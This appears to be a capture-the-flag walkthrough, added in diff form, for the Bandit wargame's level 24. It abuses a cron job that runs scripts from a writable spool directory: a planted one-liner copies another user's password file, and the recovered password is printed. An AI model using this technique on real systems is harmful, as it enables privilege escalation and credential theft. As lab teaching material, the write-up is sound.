@@ -1,0 +1,48 @@
+Let us see the contents of the directed folder:
+
+~$ ls /etc/cron.d/ 
+cronjob_bandit22  cronjob_bandit23  cronjob_bandit24  popularity-contest
+
+Since we are on level 24, let us read the file cronjob_bandit24:
+
+~$ cat /etc/cron.d/cronjob_bandit24
+@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
+* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
+
+Okay, we again have a shell script. Let us read that:
+
+~$ cat /usr/bin/cronjob_bandit24.sh 
+#!/bin/bash
+
+myname=$(whoami)
+
+cd /var/spool/$myname
+echo "Executing and deleting all scripts in /var/spool/$myname:"
+for i in * .*;
+do
+    if [ "$i" != "." -a "$i" != ".." ];
+    then
+    echo "Handling $i"
+    timeout -s 9 60 ./$i
+    rm -f ./$i
+    fi
+done
+
+So, as seen, upon reboot, all the scripts in the directory
+/var/spool/bandit24 are run for a minute, and then gets deleted.
+Thus, let us try adding a shell script there, that would be run
+by bandit24. If we simply copy the password file of bandit24 into
+/var/spool/ and change its permissions, we can read it and get the 
+password. Let us create a shell script at that directory. Moreover,
+since our script will automatically be deleted in 1 minute, let us
+be quick by writing the code as a one-liner:
+
+~$ cd /var/spool/bandit24
+/var/spool/bandit24$ touch pwn.sh && \
+> chmod 777 pwn.sh && \
+> echo $'#!/bin/bash \ncp /etc/bandit_pass/bandit24 /var/spool/bandit24/passfile \n \
+> chmod 666 /var/spool/bandit24/passfile' > pwn.sh && \
+> cat passfile
+UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
+
+Voila! We have the password for bandit24: UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
